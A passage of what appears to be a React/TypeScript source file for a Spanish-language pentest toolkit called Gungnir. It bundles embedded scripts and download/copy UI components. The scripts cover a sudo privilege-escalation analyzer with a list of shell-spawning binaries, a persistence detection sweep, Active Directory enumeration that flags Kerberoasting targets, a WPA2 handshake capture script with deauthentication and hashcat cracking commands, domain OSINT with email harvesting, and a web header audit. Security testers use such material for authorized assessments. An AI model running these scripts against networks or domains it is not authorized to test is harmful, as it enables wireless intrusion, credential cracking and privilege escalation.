RED='\\033[0;31m'; YELLOW='\\033[1;33m'; GREEN='\\033[0;32m'; NC='\\033[0m'

# Binarios que permiten spawn de shell si están en sudo
SHELL_SPAWNERS=("bash" "sh" "zsh" "dash" "python" "python3" "perl" "ruby" "lua"
                "awk" "gawk" "vim" "vi" "nano" "less" "more" "man" "ftp"
                "git" "find" "nmap" "env" "strace" "socat" "netcat" "nc")

# Binarios que permiten escritura de archivos
FILE_WRITERS=("cp" "mv" "tee" "dd" "tar" "rsync" "zip" "curl" "wget" "base64"
              "openssl" "cat" "apt" "yum" "pip" "npm" "make")

echo -e "\${YELLOW}[*] Gungnir — Sudo Analyzer\${NC}"
echo -e "[*] Usuario: $(whoami) | $(date)"
echo "═══════════════════════════════════════════"

SUDO_OUTPUT=$(sudo -l 2>/dev/null)

if [ -z "$SUDO_OUTPUT" ]; then
  echo -e "\${RED}[-] No se pudo ejecutar sudo -l\${NC}"
  exit 0
fi

echo -e "\\n\${YELLOW}[*] Reglas sudo:\${NC}\\n"
echo "$SUDO_OUTPUT"
echo ""
echo "═══════════════════════════════════════════"
echo -e "\${YELLOW}[*] Analizando reglas...\${NC}\\n"

# NOPASSWD entries
NOPASSWD=$(echo "$SUDO_OUTPUT" | grep -i "NOPASSWD")
if [ -n "$NOPASSWD" ]; then
  echo -e "\${RED}[!] NOPASSWD encontrado:\${NC}"
  echo "$NOPASSWD" | while read -r LINE; do
    echo -e "  $LINE"
    BIN_NAME=$(echo "$LINE" | grep -oE '/(usr/)?s?bin/[^ ]+' | xargs basename 2>/dev/null | head -1)
    if printf '%s\\n' "\${SHELL_SPAWNERS[@]}" | grep -qx "$BIN_NAME"; then
      echo -e "  \${RED}  → SHELL SPAWN POSIBLE via $BIN_NAME\${NC}"
      echo -e "  \${RED}  → Ver: https://gtfobins.github.io/gtfobins/$BIN_NAME/#sudo\${NC}"
    fi
    if printf '%s\\n' "\${FILE_WRITERS[@]}" | grep -qx "$BIN_NAME"; then
      echo -e "  \${YELLOW}  → ESCRITURA DE ARCHIVOS posible via $BIN_NAME\${NC}"
    fi
  done
fi

# Wildcard abuse
WILDCARDS=$(echo "$SUDO_OUTPUT" | grep -E '\\*|ALL')
if [ -n "$WILDCARDS" ]; then
  echo -e "\\n\${RED}[!] Wildcards o ALL detectado:\${NC}"
  echo "$WILDCARDS"
fi

# ALL commands
if echo "$SUDO_OUTPUT" | grep -q "(ALL.*) ALL" 2>/dev/null; then
  echo -e "\\n\${RED}[CRÍTICO] Usuario puede ejecutar CUALQUIER comando como root!\${NC}"
  echo -e "\${RED}  → sudo su  ó  sudo bash  ó  sudo -i\${NC}"
fi

echo ""
echo "[*] GTFOBins: https://gtfobins.github.io/#sudo"`,
  },
  // ── Post-explotación ──────────────────────────────────────────────────────
  {
    id: 'b_persistence_check',
    name: 'Linux Persistence — Detection Sweep',
    category: 'Post-explotación',
    platform: 'linux', language: 'bash',
    severity: 'medium', script_type: 'persistence',
    description: 'Busca mecanismos de persistencia instalados en Linux: crons modificados, nuevos servicios, ssh authorized_keys, módulos de kernel, LD_PRELOAD, etc.',
    mitre_ids: ['T1053', 'T1547', 'T1078'],
    related_tools: ['linpeas'],
    tags: ['persistence', 'linux', 'detection', 'forensics'],
    notes: 'Útil tanto para Red Team (verificar persistencia instalada) como para Blue Team (detectar IOCs).',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Linux Persistence Detection Sweep
# Detecta mecanismos de persistencia instalados o sospechosos.
# MITRE ATT&CK: T1053, T1547, T1078
# Uso: ./persistence_check.sh [dias_atras]
# ═══════════════════════════════════════════════════════════════

YELLOW='\\033[1;33m'; RED='\\033[0;31m'; NC='\\033[0m'
DAYS=\${1:-7}

section() { echo -e "\\n\${YELLOW}══ $1 ══\${NC}"; }

echo -e "\${YELLOW}[*] Gungnir — Linux Persistence Check\${NC}"
echo -e "[*] Buscando cambios de los últimos $DAYS días"
echo "═══════════════════════════════════════════"

section "Cron Jobs (todos los usuarios)"
for user in $(cut -d: -f1 /etc/passwd); do
  CRON=$(crontab -u "$user" -l 2>/dev/null | grep -v '^#')
  [ -n "$CRON" ] && echo -e "  \${RED}[CRON:$user]\${NC}\n$CRON"
done
cat /etc/cron* /var/spool/cron/crontabs/* 2>/dev/null | grep -v '^#' | grep .

section "Servicios systemd modificados recientemente"
find /etc/systemd /lib/systemd /usr/lib/systemd -name "*.service" \
  -newer /etc/systemd/system -mtime -"$DAYS" 2>/dev/null | while read -r f; do
  echo -e "  \${RED}[MOD SERVICE]\${NC} $f"
  cat "$f" | grep -E "ExecStart|User|WorkingDir"
done

section "SSH Authorized Keys"
find /home /root -name "authorized_keys" 2>/dev/null | while read -r f; do
  echo -e "  \${RED}[AUTH KEYS]\${NC} $f:"
  cat "$f" 2>/dev/null
done

section "/etc/passwd y /etc/shadow modificados recientemente"
for f in /etc/passwd /etc/shadow /etc/sudoers; do
  if [ -f "$f" ]; then
    MTIME=$(stat -c '%Y' "$f")
    NOW=$(date +%s)
    DIFF=$(( (NOW - MTIME) / 86400 ))
    [ "$DIFF" -lt "$DAYS" ] && echo -e "  \${RED}[RECIENTE]\${NC} $f modificado hace \${DIFF}d"
  fi
done

section "Módulos de kernel cargados (inusuales)"
lsmod | grep -vE "^Module|^(ext4|xfs|btrfs|vfat|nls|fat|nfsd|bluetooth|bnep|rfcomm|hid|usbcore|usb_storage|ahci|sd_mod|sr_mod|cdrom|ipt|xt_|nf_|ip_|ipv6|loop|veth|bridge|ovl|snd|drm|video|i2c|acpi|button|processor|thermal|rtc|serio|input|hid)"

section "Archivos modificados recientemente (rutas sospechosas)"
find /tmp /var/tmp /dev/shm -type f -mtime -"$DAYS" 2>/dev/null | while read -r f; do
  echo -e "  \${RED}[TMP FILE]\${NC} $f ($(stat -c '%U %s bytes' "$f"))"
done

section "Binarios con SUID modificados recientemente"
find / -perm -4000 -type f -mtime -"$DAYS" 2>/dev/null | while read -r f; do
  echo -e "  \${RED}[SUID RECIENTE]\${NC} $f"
done

section "LD_PRELOAD / LD_LIBRARY_PATH"
cat /etc/ld.so.preload 2>/dev/null | grep . && echo -e "\${RED}[!] /etc/ld.so.preload no está vacío\${NC}"
grep -r "LD_PRELOAD" /etc/profile.d /etc/environment /etc/bash.bashrc ~/.bashrc 2>/dev/null

echo ""
echo "═══════════════════════════════════════════"
echo "[*] Sweep completado. Investigar \${RED}[marcados]\${NC} manualmente."`,
  },
  // ── Active Directory ───────────────────────────────────────────────────────
  {
    id: 'b_ad_enum_ps',
    name: 'Active Directory Quick Enum — PowerShell',
    category: 'Active Directory / Windows',
    platform: 'windows', language: 'powershell',
    severity: 'medium', script_type: 'enum',
    description: 'Enumeración rápida de Active Directory sin herramientas externas. Usa solo módulos PowerShell nativos (ActiveDirectory si está disponible, o ADSI como fallback).',
    mitre_ids: ['T1087', 'T1069', 'T1016'],
    related_tools: ['bloodhound', 'crackmapexec', 'impacket'],
    tags: ['ad', 'windows', 'enum', 'powershell', 'domain'],
    notes: 'Sin módulo AD: el fallback ADSI funciona en cualquier sistema unido al dominio. No requiere privilegios elevados para la mayoría de queries.',
    content: `# ═══════════════════════════════════════════════════════════════
# Gungnir — Active Directory Quick Enumeration
# Enum básico de AD sin herramientas externas.
# MITRE ATT&CK: T1087, T1069, T1016
# Uso: .\\ad_enum.ps1 [-Domain domain.local]
# ═══════════════════════════════════════════════════════════════

param([string]$Domain = $env:USERDNSDOMAIN)

Write-Host ""
Write-Host "=== Gungnir — AD Quick Enum ===" -ForegroundColor Yellow
Write-Host "[*] Dominio: $Domain" -ForegroundColor Cyan
Write-Host "[*] Usuario: $env:USERNAME @ $(hostname)"
Write-Host ""

function Section($title) {
    Write-Host "\`n══ $title ══" -ForegroundColor Yellow
}

# Verificar si el módulo AD está disponible
$hasAD = Get-Module -ListAvailable ActiveDirectory -ErrorAction SilentlyContinue

Section "Información del dominio"
if ($hasAD) {
    $dom = Get-ADDomain -Identity $Domain 2>$null
    $dom | Select-Object Name, DomainMode, PDCEmulator, DNSRoot, Forest | Format-List
} else {
    $dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
    Write-Host "  Nombre    : $($dom.Name)"
    Write-Host "  PDC       : $($dom.PdcRoleOwner)"
    Write-Host "  Forest    : $($dom.Forest)"
}

Section "Domain Controllers"
if ($hasAD) {
    Get-ADDomainController -Filter * | Select-Object Name, IPv4Address, OperatingSystem | Format-Table -AutoSize
} else {
    $dom.DomainControllers | ForEach-Object { Write-Host "  DC: $($_.Name)" }
}

Section "Usuarios del dominio (primeros 50)"
if ($hasAD) {
    Get-ADUser -Filter * -Properties LastLogonDate, Description |
        Select-Object SamAccountName, Name, Enabled, LastLogonDate, Description |
        Sort-Object SamAccountName | Select-Object -First 50 | Format-Table -AutoSize
} else {
    $searcher = New-Object System.DirectoryServices.DirectorySearcher
    $searcher.Filter = "(&(objectClass=user)(objectCategory=person))"
    $searcher.SizeLimit = 50
    $searcher.FindAll() | ForEach-Object {
        $u = $_.Properties
        Write-Host "  $($u['samaccountname']) — $($u['displayname'])"
    }
}

Section "Grupos privilegiados"
$privGroups = @("Domain Admins", "Enterprise Admins", "Schema Admins", "Administrators", "Account Operators", "Backup Operators")
foreach ($grp in $privGroups) {
    if ($hasAD) {
        $members = Get-ADGroupMember -Identity $grp -Recursive -ErrorAction SilentlyContinue |
                   Select-Object -ExpandProperty SamAccountName
        if ($members) {
            Write-Host "  [$grp]: $($members -join ', ')" -ForegroundColor $(if ($grp -eq "Domain Admins") {"Red"} else {"White"})
        }
    }
}

Section "SPNs (Kerberoasting candidates)"
if ($hasAD) {
    Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and Enabled -eq $true} \`
        -Properties ServicePrincipalName, PasswordLastSet |
        Select-Object SamAccountName, ServicePrincipalName, PasswordLastSet |
        Format-Table -AutoSize
} else {
    Write-Host "  Usar: setspn -Q */* | findstr /i ':'"
}

Section "AS-REP Roasting candidates (no preauth)"
if ($hasAD) {
    Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true -and Enabled -eq $true} |
        Select-Object SamAccountName, DistinguishedName |
        Format-Table -AutoSize
}

Section "Computadoras del dominio"
if ($hasAD) {
    Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate |
        Select-Object Name, OperatingSystem, LastLogonDate |
        Sort-Object LastLogonDate -Descending | Select-Object -First 30 |
        Format-Table -AutoSize
}

Section "Password Policy"
if ($hasAD) {
    Get-ADDefaultDomainPasswordPolicy | Format-List MinPasswordLength, LockoutThreshold, MaxPasswordAge
}

Write-Host ""
Write-Host "══════════════════════════════════════════" -ForegroundColor DarkGray
Write-Host "[*] Para análisis completo: bloodhound-python o SharpHound" -ForegroundColor Yellow
Write-Host "[*] Kerberoast: GetUserSPNs.py domain/user:pass -dc-ip <DC-IP> -request" -ForegroundColor Yellow
Write-Host ""`,
  },
  // ── Wireless ────────────────────────────────────────────────────────────────
  {
    id: 'b_wifi_audit',
    name: 'WiFi Audit — WPA2 Handshake Capture',
    category: 'Wireless / WiFi',
    platform: 'linux', language: 'bash',
    severity: 'high', script_type: 'wireless',
    description: 'Automatiza la captura de handshake WPA2: pone la tarjeta en monitor mode, escanea redes, selecciona objetivo y ejecuta deauth para forzar reconexión. Guarda el .cap para crackeo offline.',
    mitre_ids: [],
    related_tools: ['aircrackng', 'wifite', 'hashcat'],
    tags: ['wifi', 'wpa2', 'handshake', 'monitor-mode', 'deauth'],
    notes: 'Requiere tarjeta WiFi con soporte de monitor mode e inyección de paquetes. Instalar: apt install aircrack-ng.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — WiFi WPA2 Handshake Capture
# Captura handshakes WPA2 para crackeo offline con hashcat.
# Requiere: aircrack-ng suite, tarjeta con monitor mode
# Uso: ./wifi_audit.sh [interface]
# ADVERTENCIA: Solo redes propias o con autorización.
# ═══════════════════════════════════════════════════════════════

RED='\\033[0;31m'; YELLOW='\\033[1;33m'; GREEN='\\033[0;32m'; NC='\\033[0m'

IFACE=\${1:-"wlan0"}
CAPTURE_DIR="./captures"
mkdir -p "$CAPTURE_DIR"

cleanup() {
  echo -e "\\n\${YELLOW}[*] Limpiando monitor mode...\${NC}"
  airmon-ng stop "\${IFACE}mon" 2>/dev/null
  systemctl start NetworkManager 2>/dev/null
  echo -e "\${GREEN}[*] Interfaz restaurada.\${NC}"
  exit 0
}
trap cleanup SIGINT SIGTERM

# Verificar root y dependencias
[ "$(id -u)" != "0" ] && { echo -e "\${RED}[!] Ejecutar como root.\${NC}"; exit 1; }
command -v airmon-ng &>/dev/null || { echo -e "\${RED}[!] Instalar: apt install aircrack-ng\${NC}"; exit 1; }

echo -e "\${YELLOW}[*] Gungnir — WiFi WPA2 Auditor\${NC}"
echo -e "[*] Interfaz: $IFACE"
echo ""

# Paso 1: Matar procesos que interfieren
echo -e "\${YELLOW}[*] Paso 1: Liberando interfaz...\${NC}"
airmon-ng check kill 2>/dev/null

# Paso 2: Monitor mode
echo -e "\${YELLOW}[*] Paso 2: Activando monitor mode...\${NC}"
airmon-ng start "$IFACE" 2>/dev/null
MON_IFACE="\${IFACE}mon"
ip link show "$MON_IFACE" &>/dev/null || MON_IFACE="\${IFACE}"
echo -e "\${GREEN}[+] Monitor mode en: $MON_IFACE\${NC}"

# Paso 3: Escanear redes
SCAN_FILE="/tmp/gungnir_scan"
echo -e "\\n\${YELLOW}[*] Paso 3: Escaneando redes WiFi (15 seg)...\${NC}"
echo -e "\${YELLOW}    Presionar Ctrl+C cuando veas el objetivo.\${NC}\\n"
timeout 15 airodump-ng "$MON_IFACE" --output-format csv -w "$SCAN_FILE" 2>/dev/null
clear

# Parsear resultados
echo -e "\${YELLOW}[*] Redes encontradas:\${NC}\\n"
echo "  #   BSSID               CH  ESSID                     ENC"
echo "  ─────────────────────────────────────────────────────────"
i=1
declare -A NETS
if [ -f "\${SCAN_FILE}-01.csv" ]; then
  while IFS=',' read -r BSSID FIRST LAST CH _MB ENC _CIPHER _AUTH _PWR _BEACONS _IV _LAN _IP _ID_LEN ESSID _KEY; do
    BSSID=$(echo "$BSSID" | tr -d ' ')
    ESSID=$(echo "$ESSID" | tr -d ' ')
    CH=$(echo "$CH" | tr -d ' ')
    [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
    [[ "$ENC" =~ "WPA" ]] || continue
    printf "  %-3s %-20s %-3s %-25s %s\\n" "$i" "$BSSID" "$CH" "$ESSID" "$ENC"
    NETS[$i]="$BSSID:$CH:$ESSID"
    ((i++))
  done < <(tail -n +3 "\${SCAN_FILE}-01.csv" | head -50)
fi
rm -f "\${SCAN_FILE}"*.csv 2>/dev/null

echo ""
read -rp "Seleccionar número de red objetivo: " SEL
NET_INFO=\${NETS[$SEL]:-}
[ -z "$NET_INFO" ] && { echo -e "\${RED}[!] Selección inválida.\${NC}"; cleanup; }

TARGET_BSSID=$(echo "$NET_INFO" | cut -d: -f1-6)
TARGET_CH=$(echo "$NET_INFO" | cut -d: -f7)
TARGET_ESSID=$(echo "$NET_INFO" | cut -d: -f8-)
CAPTURE_FILE="$CAPTURE_DIR/\${TARGET_ESSID// /_}_$(date +%H%M%S)"

echo -e "\\n\${GREEN}[+] Objetivo: $TARGET_ESSID ($TARGET_BSSID) CH$TARGET_CH\${NC}"

# Paso 4: Capturar en background
echo -e "\${YELLOW}[*] Paso 4: Capturando tráfico...\${NC}"
airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "$CAPTURE_FILE" "$MON_IFACE" &
DUMP_PID=$!

sleep 3

# Paso 5: Deauth para forzar handshake
echo -e "\${YELLOW}[*] Paso 5: Enviando deauth (forzando reconexión)...\${NC}"
for i in 1 2 3; do
  aireplay-ng -0 5 -a "$TARGET_BSSID" "$MON_IFACE" 2>/dev/null
  sleep 3
  echo -e "  [*] Deauth ronda $i/3"
done

# Esperar handshake
echo -e "\${YELLOW}[*] Esperando handshake 30 seg...\${NC}"
sleep 30

kill $DUMP_PID 2>/dev/null

# Verificar captura
if ls "\${CAPTURE_FILE}"*.cap &>/dev/null; then
  echo -e "\\n\${GREEN}[+] Handshake capturado: \${CAPTURE_FILE}-01.cap\${NC}"
  echo -e "\${YELLOW}[*] Crackear con hashcat:\${NC}"
  echo "    hcxpcapngtool -o \${TARGET_ESSID}.hc22000 \${CAPTURE_FILE}-01.cap"
  echo "    hashcat -m 22000 \${TARGET_ESSID}.hc22000 /usr/share/wordlists/rockyou.txt"
else
  echo -e "\${RED}[-] No se capturó handshake. Intentar más deauths o esperar clientes.\${NC}"
fi

cleanup`,
  },
  {
    id: 'b_domain_osint',
    name: 'Domain OSINT — Passive Recon',
    category: 'Enumeración y reconocimiento',
    platform: 'linux', language: 'bash',
    severity: 'info', script_type: 'enum',
    description: 'Recopilación pasiva de información sobre un dominio: WHOIS, registros DNS (A, MX, NS, TXT, SPF, DMARC), subdominios via Certificate Transparency y búsqueda en Shodan.',
    mitre_ids: ['T1590', 'T1596'],
    related_tools: ['amass', 'subfinder', 'theHarvester'],
    tags: ['osint', 'dns', 'recon', 'passive', 'ct-logs'],
    notes: 'Solo usa fuentes públicas, sin conexión directa al objetivo. 100% pasivo y sigiloso.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Domain Passive OSINT
# Recon pasivo: WHOIS, DNS, CT logs, Shodan.
# MITRE ATT&CK: T1590, T1596
# Requiere: whois, dig, curl, jq (apt install jq)
# Uso: ./domain_osint.sh <dominio>
# ═══════════════════════════════════════════════════════════════

YELLOW='\\033[1;33m'; GREEN='\\033[0;32m'; NC='\\033[0m'

DOMAIN=\${1:-}
[ -z "$DOMAIN" ] && { echo "Uso: $0 <dominio>"; exit 1; }
OUT="osint_\${DOMAIN}_$(date +%Y%m%d).txt"

section() { echo -e "\\n\${YELLOW}══ $1 ══\${NC}" | tee -a "$OUT"; }
run()     { eval "$@" 2>/dev/null | tee -a "$OUT"; }

echo -e "\${YELLOW}[*] Gungnir — Domain OSINT\${NC}" | tee "$OUT"
echo "[*] Dominio: $DOMAIN | $(date)" | tee -a "$OUT"
echo "═══════════════════════════════════════════" | tee -a "$OUT"

section "WHOIS"
run "whois $DOMAIN | grep -iE 'Registrar|Creation|Expiry|Updated|Name Server|Admin Email|Registrant'"

section "DNS — Registros básicos"
for TYPE in A AAAA MX NS TXT SOA; do
  echo -e "\${GREEN}[$TYPE]\${NC}" | tee -a "$OUT"
  run "dig +short $TYPE $DOMAIN"
done

section "SPF / DMARC / DKIM (email security)"
echo "SPF:" | tee -a "$OUT"
run "dig +short TXT $DOMAIN | grep spf"
echo "DMARC:" | tee -a "$OUT"
run "dig +short TXT _dmarc.$DOMAIN"
echo "DKIM (selector common/default/google):" | tee -a "$OUT"
for sel in default google mail selector1 selector2 s1 s2 k1; do
  REC=$(dig +short TXT "\${sel}._domainkey.$DOMAIN" 2>/dev/null)
  [ -n "$REC" ] && echo "  [\${sel}] $REC" | tee -a "$OUT"
done

section "Certificate Transparency — Subdominios"
echo "[*] Consultando crt.sh..." | tee -a "$OUT"
curl -s "https://crt.sh/?q=%.\${DOMAIN}&output=json" 2>/dev/null | \
  jq -r '.[].name_value' 2>/dev/null | \
  sed 's/\\*\\.//g' | sort -u | grep -v "^$DOMAIN$" | \
  head -50 | tee -a "$OUT"

section "Shodan (sin API key — web scrape básico)"
echo "[*] Para búsqueda completa: shodan search 'hostname:$DOMAIN'" | tee -a "$OUT"
echo "[*] O registrarse en https://shodan.io y usar: pip install shodan" | tee -a "$OUT"

section "ASN / IP Range"
IP=$(dig +short A "$DOMAIN" | head -1)
if [ -n "$IP" ]; then
  echo -e "\${GREEN}IP principal: $IP\${NC}" | tee -a "$OUT"
  run "whois $IP | grep -iE 'netname|orgname|country|cidr|netrange'"
fi

section "Email Harvesting (theHarvester)"
if command -v theHarvester &>/dev/null; then
  run "theHarvester -d $DOMAIN -b google,bing,linkedin -l 100 2>/dev/null | grep -E '@|Found'"
else
  echo "[-] theHarvester no disponible. Instalar: apt install theharvester" | tee -a "$OUT"
fi

echo "" | tee -a "$OUT"
echo "═══════════════════════════════════════════" | tee -a "$OUT"
echo "[*] Resultado completo en: $OUT" | tee -a "$OUT"`,
  },
  {
    id: 'b_web_headers',
    name: 'Web Security Headers — Audit',
    category: 'Detección de vulnerabilidades',
    platform: 'cross', language: 'bash',
    severity: 'medium', script_type: 'detection',
    description: 'Audita los headers de seguridad HTTP de un sitio web: Content-Security-Policy, HSTS, X-Frame-Options, X-Content-Type-Options, CORS y cookies inseguras. Genera reporte con hallazgos.',
    mitre_ids: ['T1190'],
    related_tools: ['curl', 'nikto', 'nuclei'],
    tags: ['web', 'headers', 'security', 'csp', 'hsts', 'cors'],
    notes: 'Headers faltantes son Finding de bajo/medio impacto pero comunes en reportes de pentest web.',
    content: `#!/bin/bash
# ═══════════════════════════════════════════════════════════════
# Gungnir — Web Security Headers Audit
# Verifica presencia y configuración de headers de seguridad HTTP.
# MITRE ATT&CK: T1190
# Requiere: curl
# Uso: ./web_headers.sh <url> [url2 url3 ...]
# ═══════════════════════════════════════════════════════════════

RED='\\033[0;31m'; YELLOW='\\033[1;33m'; GREEN='\\033[0;32m'; BLUE='\\033[0;34m'; NC='\\033[0m'

URLS=("$@")
[ \${#URLS[@]} -eq 0 ] && { echo "Uso: $0 <url> [url2...]"; exit 1; }

check_header() {
  local HEADERS="$1" NAME="$2" PATTERN="$3" GOOD_MSG="$4" BAD_MSG="$5"
  local VAL=$(echo "$HEADERS" | grep -i "^$NAME:" | head -1 | cut -d: -f2- | tr -d '\\r\\n ' | head -c 100)
  if [ -n "$VAL" ]; then
    if [ -n "$PATTERN" ] && ! echo "$VAL" | grep -qi "$PATTERN"; then
      echo -e "  \${YELLOW}[WARN]\${NC} $NAME: $VAL ($BAD_MSG)"
    else
      echo -e "  \${GREEN}[OK]\${NC} $NAME: $VAL"
    fi
  else
    echo -e "  \${RED}[MISSING]\${NC} $NAME — $BAD_MSG"
  fi
}

for URL in "\${URLS[@]}"; do
  echo -e "\\n\${BLUE}═══════════════════════════════════════════\${NC}"
  echo -e "\${YELLOW}[*] Auditando: $URL\${NC}"
  echo -e "\${BLUE}═══════════════════════════════════════════\${NC}"

  RESPONSE=$(curl -sk -m 10 -I -L --max-redirs 3 "$URL" 2>/dev/null)
  [ -z "$RESPONSE" ] && { echo -e "\${RED}[!] No se pudo conectar a $URL\${NC}"; continue; }

  # Server / tecnología (info leak)
  echo -e "\\n\${YELLOW}[*] Info leak:\${NC}"
  SERVER=$(echo "$RESPONSE" | grep -i "^server:" | head -1)
  POWERED=$(echo "$RESPONSE" | grep -i "^x-powered-by:" | head -1)
  [ -n "$SERVER" ]  && echo -e "  \${YELLOW}[LEAK]\${NC} $SERVER"
  [ -n "$POWERED" ] && echo -e "  \${YELLOW}[LEAK]\${NC} $POWERED"

  # Headers de seguridad
  echo -e "\\n\${YELLOW}[*] Security headers:\${NC}"
  check_header "$RESPONSE" "Strict-Transport-Security" "max-age" \
    "HSTS activo" "HSTS faltante — sujeto a downgrade attack"
  check_header "$RESPONSE" "Content-Security-Policy" "" \
    "CSP presente" "CSP faltante — permite XSS/injection"
  check_header "$RESPONSE" "X-Frame-Options" "DENY\\|SAMEORIGIN" \
    "Clickjacking protegido" "Clickjacking posible"
  check_header "$RESPONSE" "X-Content-Type-Options" "nosniff" \
    "MIME sniffing bloqueado" "MIME sniffing posible"
  check_header "$RESPONSE" "Referrer-Policy" "" \
    "Referrer controlado" "Referrer Policy faltante"
  check_header "$RESPONSE" "Permissions-Policy" "" \
    "Permissions Policy presente" "Permissions Policy faltante"

  # CORS
  echo -e "\\n\${YELLOW}[*] CORS:\${NC}"
  CORS=$(echo "$RESPONSE" | grep -i "^access-control-allow-origin:")
  if [ -n "$CORS" ]; then
    if echo "$CORS" | grep -q "\*"; then
      echo -e "  \${RED}[VULN]\${NC} $CORS — Wildcard CORS, cualquier origen puede leer"
    else
      echo -e "  \${GREEN}[OK]\${NC} $CORS"
    fi
  else
    echo -e "  [INFO] Sin header CORS"
  fi

  # Cookies
  echo -e "\\n\${YELLOW}[*] Cookies:\${NC}"
  echo "$RESPONSE" | grep -i "^set-cookie:" | while read -r COOKIE; do
    MISSING=""
    echo "$COOKIE" | grep -qi "httponly" || MISSING="$MISSING [sin HttpOnly]"
    echo "$COOKIE" | grep -qi "secure"   || MISSING="$MISSING [sin Secure]"
    echo "$COOKIE" | grep -qi "samesite" || MISSING="$MISSING [sin SameSite]"
    if [ -n "$MISSING" ]; then
      echo -e "  \${RED}[INSECURE]\${NC} $(echo "$COOKIE" | cut -c1-80) →$MISSING"
    else
      echo -e "  \${GREEN}[OK]\${NC} $(echo "$COOKIE" | cut -c1-80)"
    fi
  done
done

echo ""
echo "═══════════════════════════════════════════"
echo "[*] Para análisis completo: nuclei -u <url> -t exposures/configs/"`,
  },
]

// ─── Copy button ──────────────────────────────────────────────────────────────
function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  return (
    <button onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 1500) }}
      className='p-1.5 rounded text-zinc-500 hover:text-zinc-200 hover:bg-zinc-800 transition' title='Copiar'>
      {copied ? <Check className='h-3.5 w-3.5 text-green-400' /> : <Copy className='h-3.5 w-3.5' />}
    </button>
  )
}

// ─── Download button ───────────────────────────────────────────────────────────
function DownloadBtn({ script }: { script: Script }) {
  const download = () => {
    const ext = LANG_EXT[script.language]
    const filename = script.name.toLowerCase().replace(/[^a-z0-9]+/g, '_').replace(/^_|_$/g, '') + ext
    const blob = new Blob([script.content], { type: 'text/plain' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url; a.download = filename; a.click()
    URL.revokeObjectURL(url)
    toast.success(`Descargando ${filename}`)
  }
  return (
    <button onClick={download}
      className='flex items-center gap-1.5 rounded-md border border-zinc-700 px-3 py-1.5 text-xs text-zinc-400 hover:border-red-800 hover:text-red-400 transition'>
      <Download className='h-3 w-3' />
      Descargar {LANG_EXT[script.language]}
    </button>
  )
}

// ─── Script Card ──────────────────────────────────────────────────────────────
interface ScriptCardProps {
  script: Script
  onEdit?: () => void
  onDelete?: () => void
}
function ScriptCard({ script, onEdit, onDelete }: ScriptCardProps) {
  const [expanded, setExpanded] = useState(false)
  const sev = SEVERITY_META[script.severity]

  return (
    <div className={cn('rounded-lg border bg-zinc-900/60', script.isCustom ? 'border-red-900/40' : 'border-zinc-800')}>
      {/* Header */}
      <div className='flex items-start gap-3 p-4'>
        <FileCode2 className='h-4 w-4 text-zinc-500 mt-0.5 shrink-0' />
        <div className='flex-1 min-w-0'>
          <div className='flex items-center gap-2 flex-wrap'>
            {script.isCustom && <span className='text-[9px] font-bold text-red-500 bg-red-500/10 border border-red-500/20 px-1 py-0.5 rounded'>CUSTOM</span>}
            {script.isModified && <span className='text-[9px] font-bold text-yellow-600 bg-yellow-600/10 border border-yellow-600/20 px-1 py-0.5 rounded'>EDIT</span>}
            <span className='font-semibold text-sm text-zinc-100'>{script.name}</span>
          </div>
          <p className='mt-1 text-xs text-zinc-400 leading-relaxed'>{script.description}</p>

          {/* Badges row */}
          <div className='mt-2 flex flex-wrap items-center gap-1.5'>
            <span className='text-[10px] text-zinc-500 bg-zinc-800 px-1.5 py-0.5 rounded'>{PLATFORM_LABEL[script.platform]}</span>
            <span className='text-[10px] text-zinc-500 bg-zinc-800 px-1.5 py-0.5 rounded font-mono'>{LANG_LABEL[script.language]}</span>
            <span className={cn('text-[10px] border px-1.5 py-0.5 rounded', sev.cls)}>{sev.label}</span>
            <span className='text-[10px] text-zinc-600 bg-zinc-800/60 px-1.5 py-0.5 rounded'>{TYPE_LABEL[script.script_type]}</span>

            {/* MITRE links */}
            {script.mitre_ids.map(id => (
              <Link key={id} to='/tecnicas' search={{ mitre: id }}
                className='flex items-center gap-0.5 text-[10px] text-zinc-600 hover:text-red-400 transition'>
                <ExternalLink className='h-2.5 w-2.5' />{id}
              </Link>
            ))}
          </div>

          {/* Related Arsenal tools */}
          {script.related_tools.length > 0 && (
            <div className='mt-1.5 flex flex-wrap gap-1'>
              {script.related_tools.map(t => (
                <span key={t} className='text-[9px] text-zinc-600 border border-zinc-800 px-1.5 py-0.5 rounded-full'>
                  🔧 {t}
                </span>
              ))}
            </div>
          )}

          {/* Notes */}
          {script.notes && (
            <p className='mt-1.5 text-[10px] text-zinc-600 italic flex items-center gap-1'>
              <Info className='h-3 w-3 shrink-0' /> {script.notes}
            </p>
          )}
        </div>

        {/* Actions */}
        <div className='flex items-center gap-1 shrink-0'>
          {onEdit && (
            <button onClick={onEdit} className='p-1.5 rounded text-zinc-600 hover:text-zinc-300 hover:bg-zinc-800 transition' title='Editar'>
              <Pencil className='h-3.5 w-3.5' />
            </button>
          )}
          {onDelete && (
            <button onClick={onDelete} className='p-1.5 rounded text-zinc-600 hover:text-red-400 hover:bg-red-900/20 transition' title='Eliminar'>
              <Trash2 className='h-3.5 w-3.5' />
            </button>
          )}
          <CopyBtn text={script.content} />
          <DownloadBtn script={script} />
          <button onClick={() => setExpanded(e => !e)}
            className='p-1.5 rounded text-zinc-500 hover:text-zinc-200 hover:bg-zinc-800 transition'>
            {expanded ? <ChevronDown className='h-3.5 w-3.5' /> : <ChevronRight className='h-3.5 w-3.5' />}
          </button>
        </div>
      </div>

      {/* Script content (expandable) */}
      {expanded && (
        <div className='border-t border-zinc-800 relative'>
          <pre className='overflow-x-auto px-4 py-3 text-[11px] font-mono text-zinc-300 leading-relaxed max-h-96 overflow-y-auto bg-zinc-950/60 whitespace-pre'>
            {script.content}
          </pre>
